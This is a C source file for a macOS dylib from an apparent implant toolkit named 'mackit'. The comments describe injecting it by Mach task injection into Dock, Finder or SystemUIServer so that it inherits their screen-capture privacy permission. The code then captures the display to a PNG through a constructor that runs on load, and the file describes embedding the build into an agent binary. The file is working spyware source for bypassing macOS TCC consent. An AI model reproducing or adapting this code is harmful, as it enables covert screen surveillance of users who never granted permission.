// screenshot.c – mackit injected dylib for screen capture
//
// Injected into a process that already holds kTCCServiceScreenCapture
// (e.g. Dock, Finder, SystemUIServer) via Mach task injection.
//
// Protocol:
//   1. Caller writes desired PNG output path to /tmp/.mackit-param (no newline)
//   2. Dylib constructor reads that path, captures screen via CGDisplayCreateImage
//   3. Dylib writes PNG to that path, then creates <path>.done as a sentinel
//   4. Caller polls for <path>.done with a timeout
//
// Built by CI (macos-latest) into:
//   payload/screenshot_arm64.dylib
//   payload/screenshot_amd64.dylib
// and embedded into the agent binary via //go:embed.
//
// Compile (done by build.sh / CI):
//   arm64: clang -arch arm64 -dynamiclib -O2 \
//          -framework CoreGraphics -framework CoreFoundation -framework ImageIO \
//          -o screenshot_arm64.dylib screenshot.c
//   amd64: clang -arch x86_64 -dynamiclib -O2 \
//          -framework CoreGraphics -framework CoreFoundation -framework ImageIO \
//          -o screenshot_amd64.dylib screenshot.c

#include <CoreGraphics/CoreGraphics.h>
#include <CoreFoundation/CoreFoundation.h>
#include <ImageIO/ImageIO.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Read the output path from the param file.
static int read_param(char *buf, size_t buflen) {
    FILE *f = fopen("/tmp/.mackit-param", "r");
    if (!f) return 0;
    size_t n = fread(buf, 1, buflen - 1, f);
    fclose(f);
    buf[n] = '\0';
    // strip trailing newline / whitespace
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r' || buf[n-1] == ' '))
        buf[--n] = '\0';
    return n > 0;
}

static void write_sentinel(const char *out_path) {
    char sentinel[4096];
    snprintf(sentinel, sizeof(sentinel), "%s.done", out_path);
    FILE *f = fopen(sentinel, "w");
    if (f) fclose(f);
}

// Performs the screen capture on the calling thread.
// CGDisplayCreateImage reads directly from the display framebuffer and is
// available on all macOS versions including 15+.  Unlike CGWindowListCreateImage
// (removed in macOS 15) it does not require the main thread.
static void do_capture(const char *out_path) {
    // Capture the main display framebuffer — works from any thread, macOS 10.6+
    CGImageRef img = CGDisplayCreateImage(CGMainDisplayID());
    if (!img) {
        write_sentinel(out_path);  // signal even on failure so caller doesn't hang
        return;
    }

    // Write as PNG via ImageIO
    CFStringRef path_cf = CFStringCreateWithCString(
        kCFAllocatorDefault, out_path, kCFStringEncodingUTF8);
    CFURLRef url = CFURLCreateWithFileSystemPath(
        kCFAllocatorDefault, path_cf, kCFURLPOSIXPathStyle, false);
    CFRelease(path_cf);

    // "public.png" — avoids linking against UTType framework
    CGImageDestinationRef dst = CGImageDestinationCreateWithURL(
        url, CFSTR("public.png"), 1, NULL);
    CFRelease(url);

    if (dst) {
        CGImageDestinationAddImage(dst, img, NULL);
        CGImageDestinationFinalize(dst);
        CFRelease(dst);
    }
    CGImageRelease(img);

    write_sentinel(out_path);
}

__attribute__((constructor))
static void mackit_screenshot_init(void) {
    char out_path[4096];
    if (!read_param(out_path, sizeof(out_path))) return;
    // CGDisplayCreateImage is thread-safe; no dispatch to main queue needed.
    do_capture(out_path);
}
